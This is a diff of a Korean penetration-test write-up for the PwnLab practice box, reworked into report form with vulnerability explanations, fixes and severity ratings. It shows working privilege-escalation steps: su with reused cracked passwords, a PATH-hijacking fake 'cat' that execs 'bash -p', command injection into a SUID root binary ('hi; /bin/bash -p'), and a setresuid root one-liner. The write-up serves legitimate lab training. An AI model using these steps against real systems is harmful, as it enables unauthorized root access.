-/usr/bin/newgrp
-/usr/bin/chfn
-/usr/bin/at
-/usr/bin/passwd
-/usr/bin/procmail
-/usr/bin/chsh
-/usr/bin/gpasswd
-/usr/lib/eject/dmcrypt-get-device
-/usr/lib/pt_chown
-/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-/usr/lib/openssh/ssh-keysign
-/usr/sbin/exim4
-```
+**Steps to reproduce the attack:**
+1. 앞서 디코딩한 비밀번호 3개(`JWzXuBJJNy`·`SIfdsTEn6I`·`iSv5Ym2GRo`)를 `su` 로 순서대로 시도
+2. `su kent` 통과하나 홈이 완전히 비어 막다른 길
+3. `su kane` 통과 → `local.txt` 및 SUID `msgmike` 확인
 
-전부 배포판 기본이다. **커스텀 SUID 가 하나도 없어 보인다.** 그런데 나중에 root 로 같은 `harvest.sh` 를 돌리면 목록이 다르다.
+`su` 는 TTY 를 요구하므로 리버스셸에 pty 를 먼저 올려야 한다(이 셸은 `www-data@pwnlab:...$` 프롬프트가 이미 붙어 있어 pty 가 있는 상태 — `can't access tty` 로 시작한 원시 `/bin/sh` 세션에서 `python -c "import pty;pty.spawn('/bin/bash')"` 를 보내 전환한 것으로 추정되나, `sh` 가 입력을 에코하지 않아 그 명령 자체는 캡처에 안 남고 프롬프트 변화만 남았음).
 
-```
-===== SUID =====
-/bin/mount
-/bin/su
-/bin/umount
-/sbin/mount.nfs
-/home/mike/msg2root
-/home/kane/msgmike
-...
-```
-
-> [!danger] `find / -perm -4000` 은 "내가 들어갈 수 있는 디렉터리" 안에서만 참이다
-> `/home/*` 이 전부 `drwxr-x---` 라 www-data 는 디렉터리를 열 수 없고, 그래서 그 안의 SUID 바이너리가
-> **에러 없이 그냥 목록에서 빠진다**(`find` 의 `Permission denied` 는 `2>/dev/null` 로 버려진다).
-> **커스텀 SUID 가 안 보인다 = 없다** 가 아니다. 사용자 계정으로 옆걸음한 뒤 **같은 열거를 다시 돌려라.**
-> 이 박스는 그 차이가 곧 권한상승 경로 전체였다.
-
-`/tmp` 관련해서 하나 더 나왔다.
-
-```
-lrwxrwxrwx 1 root     root        5 Mar 17  2016 /var/www/html/upload -> /tmp/
-```
-
-업로드 디렉터리가 `/tmp` 심볼릭 링크다. 그래서 아까 올린 gif 가 `/tmp/63f0...gif` 로 떨어져 있었다.
-
-### 4-2. www-data → kane (비밀번호 재사용)
-
-DB 에서 꺼낸 세 비밀번호를 `su` 로 시도한다. SSH 가 닫혀 있으니 셸 안에서 해야 하고, `su` 는 TTY 를 요구하므로 앞에서 pty 를 붙여둔 것이 여기서 필요해진다.
-
-```
+```text
 www-data@pwnlab:/tmp$ su kent
 Password: 
 kent@pwnlab:/tmp$ id; ls -la ~
@@ -446,12 +399,9 @@ drwxr-xr-x 6 root root 4096 Mar 17  2016 ..
 -rw-r--r-- 1 kent kent 3515 Mar 17  2016 .bashrc
 -rw-r--r-- 1 kent kent  675 Mar 17  2016 .profile
 ```
+— 출처: `~/PG/PwnLab/shell_www-data.log`. `su` 는 비밀번호를 에코하지 않아 `Password:` 뒤가 비어 있음(넣은 값은 `JWzXuBJJNy`). kent 홈은 dotfile 뿐 — 막다른 길.
 
-`su` 는 비밀번호를 에코하지 않으므로 캡처의 `Password: ` 뒤는 비어 있다. 넣은 값은 `JWzXuBJJNy` 다.
-
-kent 홈은 dotfile 넷뿐이다 — `.bash_history` 도 0바이트. 막다른 길이라 kane 으로 옮긴다(`iSv5Ym2GRo`).
-
-```
+```text
 kent@pwnlab:/tmp$ su kane
 Password: 
 kane@pwnlab:/tmp$ id; ls -la /home/kane /home/mike /home/john 2>&1
@@ -469,16 +419,24 @@ drwxr-xr-x 6 root root 4096 Mar 17  2016 ..
 -rw-r--r-- 1 kane kane  675 Mar 17  2016 .profile
 ls: cannot open directory /home/mike: Permission denied
 ```
+— 출처: `~/PG/PwnLab/shell_www-data.log`(`iSv5Ym2GRo`로 진입). `2>&1` 을 안 붙이면 `ls` 의 `Permission denied` 가 stderr 로 사라져 "mike 홈이 비었다"로 잘못 읽기 쉽다 — 여기서는 그 줄이 "아직 mike 가 아니다"라는 정보다.
 
-`2>&1` 을 붙인 이유는 `ls` 가 못 읽는 디렉터리를 stderr 로 뱉기 때문이다. 캡처를 파일로 리다이렉트해 두면 `2>&1` 없이는 `Permission denied` 가 통째로 사라져서, 나중에 **"mike 홈을 봤는데 비어 있었다"** 로 잘못 기억하게 된다. 여기서는 그 줄이 곧 "아직 mike 가 아니다"라는 정보다.
+`local.txt` 와 SUID `msgmike`(소유자 mike)가 같이 나온다. mike 의 DB 비밀번호(`SIfdsTEn6I`)는 OS 계정에서는 안 통했고, 대신 이 바이너리가 mike 로 가는 통로다.
 
-`local.txt` 와 `msgmike`(SUID mike) 가 같이 나온다. mike 의 DB 비밀번호 `SIfdsTEn6I` 는 시스템 계정에서는 안 통했고, 대신 이 바이너리가 mike 로 가는 통로다.
+### Privilege Escalation – SUID msgmike 상대경로 PATH 하이재킹 (kane → mike)
 
-### 4-3. kane → mike (PATH 하이재킹)
+**Vulnerability Explanation:** SUID(mike 소유) 바이너리 `msgmike` 가 `cat` 을 절대경로 없이 `system()` 으로 호출. 호출자의 PATH 를 그대로 신뢰하므로 앞쪽에 가짜 `cat` 을 심으면 mike 권한으로 임의 코드가 실행됨.
 
-먼저 바이너리를 통째로 훑고 그대로 한 번 실행해봤다. 아래는 `strings` 출력에서 읽을 부분만 남긴 것이고, `===` 뒤가 실행 결과다.
+**Vulnerability Fix:** SUID 바이너리에서 외부 명령 호출 시 절대경로를 쓴다(`/bin/cat`). 불가피하면 `execve` 로 넘기기 전 PATH·IFS 등 환경변수를 초기화한다.
 
-```
+**Severity:** High — 저권한 계정에서 다른 계정(mike) 권한으로 완전한 코드 실행 획득
+
+**Steps to reproduce the attack:**
+1. `strings msgmike` 로 상대경로 `cat` 호출 확인
+2. `/tmp/.pth/cat` 에 `exec /bin/bash -p` 를 심은 가짜 `cat` 작성 후 실행권한 부여
+3. `PATH=/tmp/.pth:$PATH /home/kane/msgmike` 로 실행 → mike 프롬프트로 전환
+
+```text
 kane@pwnlab:/tmp$ strings /home/kane/msgmike; echo ===; ./ /home/kane/msgmike 2>/dev/null; /home/kane/msgmike
 /lib/ld-linux.so.2
 libc.so.6
@@ -493,20 +451,17 @@ PTRh
 QVh[
 [^_]
 cat /home/mike/msg.txt
-;*2$"(
-GCC: (Debian 4.9.2-10) 4.9.2
-...
+(…이하 섹션명·crtstuff 심볼 생략…)
 ===
 cat: /home/mike/msg.txt: No such file or directory
 kane@pwnlab:/tmp$ strings /home/kane/msgmike | grep -i cat
 cat /home/mike/msg.txt
 ```
+— 출처: `~/PG/PwnLab/shell_www-data.log`(같은 구간이 `~/PG/PwnLab/try1_msgmike_histexpand.log` 에 프롬프트 없이 발췌돼 있음). `./ /home/kane/msgmike` 는 오타이고 `2>/dev/null` 로 죽어 아무것도 안 남았음 — 뒤에 붙인 두 번째 호출이 실제 실행분. `system` 과 `setreuid` 가 심볼에 함께 있고, 호출 문자열은 `cat /home/mike/msg.txt` — 절대경로가 아님.
 
-(`./ /home/kane/msgmike` 는 오타다. `2>/dev/null` 로 죽어서 아무것도 안 남았고, 뒤에 붙인 두 번째 호출이 실제 실행이다.)
+가짜 `cat` 작성 중 큰따옴표 안의 `#!` 가 bash 히스토리 확장에 먹혀(`bash: !/bin/bash\nexec: event not found`) 줄 전체가 폐기됨. 히스토리 확장은 **줄을 읽는 시점**에 일어나므로 같은 줄 앞의 `set +H` 는 이미 늦음 — **별도 줄로 먼저** 보내 해결.
 
-`system` 과 `setreuid` 가 심볼 목록에 함께 있고, 문자열은 `cat /home/mike/msg.txt` — `cat` 을 **절대경로 없이** 부른다. PATH 를 앞에서 가로채면 mike 권한으로 아무 프로그램이나 돌릴 수 있다.
-
-```
+```text
 kane@pwnlab:/tmp$ set +H
 kane@pwnlab:/tmp$ mkdir -p /tmp/.pth; printf "#!/bin/bash\nexec /bin/bash -p\n" > /tmp/.pth/cat; chmod +x /tmp/.pth/cat; /bin/cat /tmp/.pth/cat
 #!/bin/bash
@@ -523,26 +478,24 @@ drwxr-xr-x 6 root root 4096 Mar 17  2016 ..
 -rwsr-sr-x 1 root root 5364 Mar 17  2016 msg2root
 -rw-r--r-- 1 mike mike  675 Mar 17  2016 .profile
 ```
+— 출처: `~/PG/PwnLab/shell_www-data.log`. 프롬프트가 `kane@` 에서 `mike@` 로 바뀐 것이 성공 신호. 방금 `Permission denied` 였던 `/home/mike` 가 바로 열리며 SUID root `msg2root` 가 드러난다.
 
-`msgmike` 를 실행한 직후 **프롬프트가 `kane@` 에서 `mike@` 로 바뀐 것**이 성공 신호다. 그리고 조금 전 `Permission denied` 로 막혔던 `/home/mike` 가 바로 열리면서 `msg2root`(SUID **root**) 가 나온다. 계정을 얻으면 곧바로 같은 열거를 다시 돌리라는 말이 이거다.
+`id` 가 `uid=1002` 로 나온다 — euid 뿐 아니라 **real uid 까지** 바뀜. `msgmike` 가 `setreuid` 를 먼저 호출하기 때문이며, 덕분에 bash 가 권한을 떨어뜨리지 않는다. **다만 이 real-uid 전환은 이 바이너리에 한정된 관측**이고, 일반적인 SUID 셸(dash 경유)에서는 euid 만 바뀌고 real uid 는 유지돼 권한이 소실될 수 있다(`msg2root` finding 및 [[_PLAYBOOK#B-33. SUID 셸로 스크립트를 넘기면 euid 가 날아간다 (dash)]] 참고).
 
-`id` 가 `uid=1002` 로 나온다 — euid 뿐 아니라 **real uid 까지 바뀌었다.** 바이너리가 `setreuid` 를 먼저 호출하기 때문이다. 덕분에 bash 가 권한을 떨어뜨리지 않는다.
+### Privilege Escalation – SUID msg2root 무필터 커맨드 인젝션 (mike → root)
 
-> [!warning] 가짜 인터프리터 스크립트는 `#!/bin/sh` 로 쓰지 마라
-> 여기서는 SUID 바이너리가 real uid 를 이미 바꿔놓아서 `#!/bin/bash` 든 `-p` 든 상관없이 통했다.
-> 하지만 **SUID 파일을 직접 실행하는** 형태였다면 dash 가 euid 를 버리고 조용히 실패한다.
-> 습관적으로 `bash -p` 나 C 로 쓰는 편이 안전하다. `/tmp` 가 `nosuid` 로 마운트된 경우도 있으니
-> `mount` 출력을 먼저 본다. 이 박스에서 실제 디스크 마운트는 `/dev/sda1 on / type ext4 (rw,relatime,errors=remount-ro,data=ordered)`
-> 하나고 **`/tmp` 항목 자체가 없다** — 즉 `/` 의 옵션을 그대로 물려받아 `nosuid` 가 아니다.
-> (`harvest_root.txt` 의 `MOUNTS` 섹션. 나머지는 전부 sysfs·proc·cgroup 류 가상 파일시스템이고 그쪽은 다 `nosuid` 다.)
+**Vulnerability Explanation:** SUID(root 소유) 바이너리 `msg2root` 가 `fgets` 로 stdin 을 받아 `asprintf` 로 `/bin/echo %s >> /root/messages.txt` 포맷에 그대로 끼워 `system()` 실행. 입력에 세미콜론을 넣으면 뒤 문장이 root 권한 셸에서 그대로 실행됨. `/bin/echo` 자체는 절대경로라 PATH 하이재킹은 안 통하지만, 필터 없는 문자열 삽입이 더 직접적인 구멍이다.
 
-`set +H` 를 **별도 줄로** 먼저 보낸 이유는 6장에 적었다.
+**Vulnerability Fix:** 사용자 입력을 셸 명령 문자열에 직접 끼워 넣지 않는다. `execve` 로 인자 배열을 넘기거나, 최소한 세미콜론·파이프·백틱 등 셸 메타문자를 거부한다.
 
-### 4-4. mike → root (SUID 바이너리 커맨드 인젝션)
+**Severity:** Critical — 무필터 커맨드 인젝션으로 즉시 root 셸 획득
 
-`msg2root` 는 소유자가 root 인 SUID(4-3의 목록)다. 같은 반사를 한 번 더 — 먼저 `strings`.
+**Steps to reproduce the attack:**
+1. `strings msg2root` 로 `fgets`·`asprintf`·`system`·포맷 문자열(`/bin/echo %s >> /root/messages.txt`) 확인
+2. `msg2root` 실행 후 프롬프트에 `hi; /bin/bash -p` 입력 → euid=0 셸 획득
+3. `os.setresuid(0,0,0)` 으로 real uid 까지 완전한 root 로 전환
 
-```
+```text
 mike@pwnlab:/tmp$ strings /home/mike/msg2root | head -30
 /lib/ld-linux.so.2
 libc.so.6
@@ -558,44 +511,33 @@ PTRh
 [^_]
 Message for root: 
 /bin/echo %s >> /root/messages.txt
-;*2$"(
-GCC: (Debian 4.9.2-10) 4.9.2
-```
-
-읽을 심볼이 넷이다 — `fgets` 로 stdin 을 받고, `asprintf` 로 포맷 문자열에 끼워 넣고, `system` 으로 실행한다. 포맷은 `/bin/echo %s >> /root/messages.txt`.
-
-`/bin/echo` 는 절대경로라 PATH 하이재킹이 안 통한다. 대신 **사용자 입력이 그대로 포맷에 끼워져 `system()` 에 넘어간다.** 세미콜론으로 문장을 끊으면 그 뒤는 root 권한 셸에서 실행된다.
-
-```
+(…이하 GCC 배너·섹션명 생략…)
 mike@pwnlab:/tmp$ /home/mike/msg2root
 Message for root: hi; /bin/bash -p
 hi
 bash-4.3# id
 uid=1002(mike) gid=1002(mike) euid=0(root) egid=0(root) groups=0(root),1003(kane)
 ```
+— 출처: `~/PG/PwnLab/shell_www-data.log`(같은 구간이 `~/PG/PwnLab/try4_fakecat_shadowed_PATH.log` 에도 있음). `hi` 가 먼저 출력되는 것은 `/bin/echo hi` 가 정상 실행됐다는 신호. **`-p` 는 필수** — 이 바이너리는 `setreuid` 를 호출하지 않아 real uid 가 mike 로 남고, `-p` 없는 bash 는 euid 를 real uid 로 되돌림.
 
-`hi` 가 먼저 출력되는 건 `/bin/echo hi` 가 정상 실행됐기 때문이다. **`-p` 는 필수다** — 여기서는 real uid 가 mike 로 남아 있어서(`setreuid` 를 안 부르는 바이너리다) `-p` 없는 bash 는 euid 를 real uid 로 되돌린다.
+`-p` 의 이 동작은 **이 박스에서 관측한 것이 아님.** Kali 에서 SUID root C 프로그램 두 개(`execl("/bin/bash","bash","-c","id -u; id -u -r")` 와 같은 코드에 `-p` 만 추가한 것)를 `/home` 아래에 두고 직접 실행해 확인함:
 
-이건 이 박스에서 관측한 게 아니라 Kali 에서 따로 확인한 것이다. SUID root 인 C 프로그램이 `execl("/bin/bash","bash",...)` 하도록 만들어 두 경우를 재봤다.
-
-```
-┌──(kali㉿kali)-[~]
-└─$ gcc -o ~/suidtest/a ~/suidtest/a.c && sudo chown root:root ~/suidtest/a && sudo chmod 4755 ~/suidtest/a
-└─$ ~/suidtest/a          # execl("/bin/bash","bash","-c","id -u; id -u -r; echo EUID=$EUID UID=$UID")
+```text
+--- a (no -p) ---
 1000
 1000
-EUID=1000 UID=1000
-└─$ ~/suidtest/b          # 같은 코드에 "-p" 만 추가
+--- b (with -p) ---
 0
 1000
-EUID=0 UID=1000
 ```
 
-곁다리로 얻은 것 하나 — 처음에 이 테스트를 `/tmp` 에서 했더니 `-p` 를 줘도 EUID 가 1000 이었다. Kali 의 `/tmp` 가 `nosuid` 라서다(`findmnt -no OPTIONS /tmp` → `rw,nosuid,nodev,...`). **SUID 실험은 `/tmp` 에서 하지 마라.**
+`id -u`(euid) / `id -u -r`(real uid) 순서다. `-p` 가 없으면 euid 가 real uid 로 되돌려지고, 주면 euid=0 이 유지되며 real uid 만 1000 으로 남음.
 
-euid 만 root 인 상태는 불편하므로(파일 소유·`su` 등에서 걸린다) 완전한 root 로 만든다.
+곁다리 — 이 테스트를 `/tmp` 에서 하면 `-p` 를 줘도 euid 가 안 오름. Kali `/tmp` 가 `nosuid` 마운트이기 때문(`findmnt -no OPTIONS /tmp` → `rw,nosuid,nodev,size=12463400k,nr_inodes=1048576,inode64`). **SUID 실험은 `/tmp` 에서 하지 말 것.** Kali 쪽 검증용 바이너리는 실행 직후 삭제함.
 
-```
+euid 만 root 인 상태는 `su`·파일 소유 등에서 불편하므로 완전한 root 로 전환한다.
+
+```text
 bash-4.3# python -c "import os;os.setresuid(0,0,0);os.setresgid(0,0,0);os.execl(\"/bin/bash\",\"bash\")"
 root@pwnlab:/tmp# whoami; id; hostname; hostname -I; date; ls -la /root; cat /root/proof.txt
 root
@@ -615,155 +557,11 @@ lrwxrwxrwx  1 root root    9 Mar 17  2016 .mysql_history -> /dev/null
 -rw-r--r--  1 root root   33 Aug 20 04:23 proof.txt
 ```
 
-프롬프트가 `bash-4.3#` 에서 `root@pwnlab:/tmp#` 으로 바뀌고 `uid=0` 이 찍힌다. `ls -la /root` 가 여기서 세 가지를 한꺼번에 알려준다 — `flag.txt` 는 모드 `----------`(000) 의 미끼, `proof.txt` 가 진짜, 그리고 `messages.txt`·`.bash_history`·`.mysql_history` 가 전부 `/dev/null` 심볼릭 링크라 **방금 `msg2root` 로 넣은 `hi` 도 root 의 히스토리도 아무 데도 안 남는다.**
+`ls -la /root` 가 세 가지를 한꺼번에 보여줌 — `flag.txt` 는 모드 `----------`(000)의 미끼, `proof.txt` 가 진짜, 그리고 `messages.txt`·`.bash_history`·`.mysql_history` 가 전부 `/dev/null` 심볼릭 링크라 `msg2root` 로 넣은 `hi` 도 root 명령 이력도 아무 데도 안 남음.
 
-그런데 마지막 `cat /root/proof.txt` 의 출력이 없다. 원인은 6장 (4)에 있다.
+⚠️ 그런데 같은 줄 끝의 `cat /root/proof.txt` 출력이 없음. 원인은 `msgmike` PATH 하이재킹에 쓴 `PATH=/tmp/.pth:$PATH` 가 mike → msg2root → root 3단계 셸까지 그대로 상속돼 `cat` 이 가짜 `cat`(`exec /bin/bash -p`)으로 해석된 것. PATH 를 표준값으로 복원한 뒤 정상 출력됨:
 
-### 다른 경로였다면
-
-`msg2root` 를 못 찾았다면 다음 후보는 SUID `/usr/sbin/exim4` 였다. 다만 root 를 잡은 뒤 버전을 재보니 이미 패치된 쪽이었다.
-
-```
-root@pwnlab:/tmp# dpkg -l exim4-daemon-light exim4-base | tail -2; exim4 --version | head -2
-ii  exim4-base         4.84.2-1     i386         support files for all Exim MTA (v4) packages
-ii  exim4-daemon-light 4.84.2-1     i386         lightweight Exim MTA (v4) daemon
-Exim version 4.84_2 #2 built 13-Mar-2016 22:18:29
-```
-
-`4.84.2` 는 Debian 이 로컬 권한상승 수정을 백포트해 넣은 버전이라 그쪽 경로는 아니었을 것으로 본다 `[가정]` — 실제로 익스플로잇을 시도해보지는 않았다. 그 다음 후보는 커널 3.16(2016년 빌드) 로컬 익스플로잇이었을 것이다.
-
-## 5. 플래그
-
-두 개 다 표준 위치다. **2026-08-20 인스턴스 값**이고, PG 는 박스를 다시 켜면 새로 만든다.
-
-| | 경로 | 값 |
-|---|---|---|
-| user | `/home/kane/local.txt` | `e7fb032dc3da97822fc7dc2d65ffcc18` |
-| root | `/root/proof.txt` | `540256bedfbf87d15d54425649220e30` |
-
-`/root/flag.txt` 는 미끼다 — 모드 `----------`(000)에 내용은 `Your flag is in another file...` 이다. 원본 VulnHub 판의 흔적으로 보인다.
-
-user 플래그 획득 시점(kane 셸):
-
-```
-whoami; id; hostname; hostname -I; date; cat /home/kane/local.txt
-<d; hostname; hostname -I; date; cat /home/kane/local.txt
-kane
-uid=1003(kane) gid=1003(kane) groups=1003(kane)
-pwnlab
-192.168.248.29
-Thu Aug 20 04:42:55 EDT 2026
-e7fb032dc3da97822fc7dc2d65ffcc18
-```
-
-두 번째 줄의 `<d; hostname...` 은 명령이 아니라, `tmux send-keys` 로 셸을 몰 때 pty 에코가 터미널 폭에서 접혀 생긴 잔상이다. 이후 `stty cols 200` 으로 폭을 넓혀 잔상을 없앴다.
-
-root 시점:
-
-```
-whoami; id; hostname; hostname -I; date; cat /root/proof.txt; cat /home/kane/local.txt
-whoami; id; hostname; hostname -I; date; cat /root/proof.txt; cat /home/kane/local.txt
-root
-uid=0(root) gid=0(root) groups=0(root),1003(kane)
-pwnlab
-192.168.248.29
-Thu Aug 20 04:52:41 EDT 2026
-540256bedfbf87d15d54425649220e30
-e7fb032dc3da97822fc7dc2d65ffcc18
-```
-
-타겟은 EDT(UTC-4), Kali 는 KST(UTC+9)라 산출물 mtime 과 13시간 차이가 난다. 자기모순이 아니다.
-
-## 6. 막혔던 지점 / 시행착오
-
-전체 소요는 정찰 시작 17:37 → root 17:45(KST), 약 8분이었다. 그런데도 걸린 데가 넷 있었고 전부 **타겟이 아니라 도구/셸 쪽**이었다. 타겟 쪽에서 위험했던 건 (5) 하나인데, 그건 **시간을 안 태우고 지나갔다는 점에서** 오히려 더 위험한 종류다.
-
-**(1) `nnmap` 별칭이 tmux 안에서 안 먹는다** — `try2_nnmap_alias_notfound.log`
-
-`ssh kali "tmux new-session -d -s pwnlab_nmap 'cd ~/PG/PwnLab && nnmap 192.168.248.29 ...'"` 로 스캔을 걸어놓고 다른 일을 하다가, 10분 뒤 결과를 보러 갔더니 pane 에 이게 있었다.
-
-```
-zsh:1: command not found: nnmap
-┌──(kali㉿kali)-[~/PG/PwnLab]
-└─$
-```
-
-`nnmap` 은 `~/.zshrc` 의 별칭인데, tmux 가 명령 문자열을 실행할 때는 그 초기화 파일이 안 읽힌다. **스캔이 0초 만에 끝나 있었고 나는 그걸 "돌고 있는 중"으로 착각했다.** 결국 `-p-` 결과는 17:47 에야 나왔다(다행히 침투는 quick 스캔으로 이미 진행 중이었다). 교훈은 두 개다 — 별칭은 tmux 안에서 전개해서 쓸 것, 그리고 **백그라운드에 던진 작업은 "돌고 있겠지" 대신 pane 을 한 번 볼 것.**
-
-**(2) MySQL 클라이언트가 SSL 로 죽는다** — `try3_mysql_ssl.log`
-
-```
-ERROR 2026 (HY000): TLS/SSL error: SSL is required, but the server does not support it
-```
-
-Kali 의 MariaDB 클라이언트는 요즘 기본이 TLS 요구다. MySQL 5.5 는 그걸 못 한다. 반사적으로 `--ssl-mode=DISABLED` 를 쳤는데 그건 **Oracle MySQL 클라이언트 옵션**이라 MariaDB 에서는 이렇게 죽는다.
-
-```
-mysql: unknown variable 'ssl-mode=DISABLED'
-```
-
-MariaDB 쪽 이름은 `--skip-ssl` 이다. 낡은 DB 를 만나면 클라이언트 계열부터 확인하는 게 빠르다.
-
-같은 파일에 하나 더 남았다. 나중에 로그를 재현하려고 실패 명령을 반복했더니 서버가 우리 IP 를 차단했다.
-
-```
-ERROR 2002 (HY000): Received error packet before completion of TLS handshake. The authenticity of the following error cannot be verified: 1129 - Host '192.168.45.207' is blocked because of many connection errors; unblock with 'mysqladmin flush-hosts'
-```
-
-MySQL 의 `max_connect_errors` 다. **핸드셰이크 실패도 카운트에 들어간다.** 시험장에서 DB 에 크리덴셜을 여러 개 시도할 때 이걸 모르면 "비밀번호가 다 틀렸다"고 오판하게 된다. 차단되면 에러 메시지 자체가 바뀌니 문구를 구분해서 읽어야 한다.
-
-**(3) bash 히스토리 확장이 `#!` 를 먹는다** — `try1_msgmike_histexpand.log`
-
-가짜 `cat` 을 만들려고 이렇게 쳤다.
-
-```
-mkdir -p /tmp/.pth && printf "#!/bin/bash\nexec /bin/bash -p\n" > /tmp/.pth/cat && chmod +x /tmp/.pth/cat && PATH=/tmp/.pth:$PATH /home/kane/msgmike
-bash: !/bin/bash\nexec: event not found
-```
-
-큰따옴표 안의 `!` 가 히스토리 확장으로 해석된다. 문제는 그 다음이다 — **`&&` 로 이어붙여 놨기 때문에 줄 전체가 폐기돼 `mkdir` 조차 실행되지 않았다.**
-
-그래서 따옴표를 갈라 `!` 를 확장에서 떼어내는 우회를 먼저 시도했는데, 이번엔 다른 에러가 셋 나왔다.
-
-```
-kane@pwnlab:/tmp$ printf '%s\n' '#''!/bin/bash' 'exec /bin/bash -p' > /tmp/.pth/cat; chmod +x /tmp/.pth/cat; cat /tmp/.pth/cat
-bash: /tmp/.pth/cat: No such file or directory
-chmod: cannot access ‘/tmp/.pth/cat’: No such file or directory
-cat: /tmp/.pth/cat: No such file or directory
-```
-
-**따옴표 우회 자체는 통했다**(`event not found` 가 안 난다). 실패한 이유는 앞 줄에서 `mkdir` 이 안 돌아 `/tmp/.pth` 가 없기 때문이다. 여기서 잠깐 "따옴표 우회도 안 되나" 하고 엉뚱한 데를 팠다. **에러 문구가 바뀌었으면 원인도 바뀐 것**이라고 읽었어야 했다.
-
-`set +H` 를 같은 줄 앞에 붙이는 것도 안 된다.
-
-```
-kane@pwnlab:/tmp$ set +H; mkdir -p /tmp/.pth; printf "#!/bin/bash\nexec /bin/bash -p\n" > /tmp/.pth/cat; chmod +x /tmp/.pth/cat; cat /tmp/.pth/cat
-bash: !/bin/bash\nexec: event not found
-```
-
-히스토리 확장은 **줄을 읽는 시점**에 일어나므로 같은 줄의 `set +H` 는 이미 늦다. 별도 줄로 먼저 보내니 통했다(4-3의 블록). 홑따옴표로 감싸도 되지만, 셸을 `send-keys` 로 원격 조종하는 상황에서는 따옴표가 여러 겹 중첩되니 `set +H` 한 줄이 더 깔끔하다.
-
-곁다리 교훈 하나 — 이 세 번의 실패는 전부 **`&&`/`;` 로 길게 이어붙인 한 줄** 때문에 원인 파악이 늦어졌다. 파일을 만들고 실행하는 단계는 끊어서 치는 편이 결국 빠르다.
-
-**(4) 가짜 `cat` 이 root 셸까지 따라와 플래그를 삼켰다** — `try4_fakecat_shadowed_PATH.log`
-
-root 를 잡고 나서 증거 형식대로 쳤는데 플래그가 안 나왔다.
-
-```
-root@pwnlab:/tmp# whoami; id; hostname; hostname -I; date; cat /root/proof.txt; echo ---; cat /root/flag.txt
-root
-uid=0(root) gid=0(root) groups=0(root),1003(kane)
-pwnlab
-192.168.248.29 
-Thu Aug 20 04:45:44 EDT 2026
-root@pwnlab:/tmp# 
-```
-
-플래그도 안 나오지만 **`---` 도 안 찍혔다.** 이게 결정적 단서다 — `echo` 는 bash 내장이라 PATH 와 무관하게 항상 동작해야 한다. 그게 안 나왔다는 건 `cat /root/proof.txt` 에서 **줄 전체가 끊긴 것**이지 `cat` 이 조용히 실패한 게 아니다. 직전 실행(4-4)에서 `ls -la /root` 는 `-rw-r--r-- 1 root root 33 proof.txt` 를 멀쩡히 보여줬으니 파일 문제도 아니다.
-
-원인은 PATH 였다. 확인과 복원을 한 줄에 붙여 쳤다.
-
-```
+```text
 root@pwnlab:/tmp# echo "PATH=$PATH"; export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; whoami; id; hostname; hostname -I; date; cat /root/proof.txt; echo ---; cat /root/flag.txt
 PATH=/tmp/.pth:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
 root
@@ -775,95 +573,52 @@ Thu Aug 20 04:45:59 EDT 2026
 ---
 Your flag is in another file...
 ```
+— 출처: `~/PG/PwnLab/try4_fakecat_shadowed_PATH.log`·`~/PG/PwnLab/shell_www-data.log`. 두 로그 모두 `tmux send-keys` 의 입력 에코가 80열에서 겹쳐 찍힌 상태라, 위 블록은 겹친 잔상만 걷어내고 명령·출력은 원문 그대로임(에코 없는 재캡처는 `stty cols 200` 이후의 `proof_root.txt`).
 
-`PATH=/tmp/.pth:$PATH /home/kane/msgmike` 로 넘긴 환경변수가 **mike 셸 → msg2root → root 셸까지 3단계를 그대로 상속**했다. 그래서 `cat` 은 우리가 만든 가짜 `cat` 으로 해석됐고, 그 내용이 `exec /bin/bash -p` 다. `exec` 는 프로세스를 통째로 갈아치우므로 **그 줄의 나머지(`echo ---; cat /root/flag.txt`)를 파싱해 들고 있던 셸이 사라진다.** 새로 뜬 bash 가 프롬프트를 다시 그리고, 겉보기엔 "cat 이 아무것도 안 하고 돌아온" 것처럼 보인다.
+배제한 대안 경로 — `msg2root` 를 못 찾았다면 다음 후보는 SUID `/usr/sbin/exim4` 였으나 root 획득 후 버전을 재보니 이미 패치된 쪽이었음:
 
-`/root/flag.txt` 가 여기서 처음 읽힌다 — 모드 000 이지만 root 라서 읽을 수 있고, 내용은 미끼다.
-
-> [!tip] PATH 하이재킹으로 셸을 얻었으면 그 즉시 PATH 를 되돌려라
-> 하이재킹용 디렉터리가 PATH 에 남아 있는 한 **모든 후속 명령이 오염된다.** 이 박스는 `cat` 하나였지만
-> `ls`·`id` 를 덮어썼다면 열거 결과 전체를 못 믿게 된다. 증상이 "에러"가 아니라 **"조용한 무출력"** 이라
-> 원인을 엉뚱한 데서 찾게 되는데, 명령을 `; echo ---` 로 이어 쳐두면 구분이 된다 —
-> `---` 가 찍히면 그 명령만 실패한 것이고, **안 찍히면 줄 자체가 끊긴 것**이다.
-
-**(5) www-data 로 돌린 SUID 열거를 결론으로 믿을 뻔했다** — `harvest_www-data.txt` vs `harvest_root.txt`
-
-두 파일의 `===== SUID =====` 섹션을 나란히 놓으면 차이가 두 줄이다.
-
+```text
+root@pwnlab:/tmp# dpkg -l exim4-daemon-light exim4-base 2>/dev/null | tail -4; exim4 --version 2>&1 | head -2
+||/ Name               Version      Architecture Description
++++-==================-============-============-============================================
+ii  exim4-base         4.84.2-1     i386         support files for all Exim MTA (v4) packages
+ii  exim4-daemon-light 4.84.2-1     i386         lightweight Exim MTA (v4) daemon
+Exim version 4.84_2 #2 built 13-Mar-2016 22:18:29
 ```
-$ diff <(sed -n '/===== SUID/,/^===== SGID/p' harvest_www-data.txt) \
-       <(sed -n '/===== SUID/,/^===== SGID/p' harvest_root.txt)
-> /home/mike/msg2root
-> /home/kane/msgmike
-```
+— 출처: `~/PG/PwnLab/shell_www-data.log`. `4.84.2-1` 은 Debian 이 로컬 권한상승 수정을 백포트해 넣은 리비전이라 그 경로는 아니었을 것으로 봄 `[가정]` — **익스플로잇을 실제로 시도하지는 않았으므로 배제가 아니라 미검증이다.** 그 다음 후보는 커널 3.16(2016년 빌드) 로컬 익스플로잇이었을 것.
 
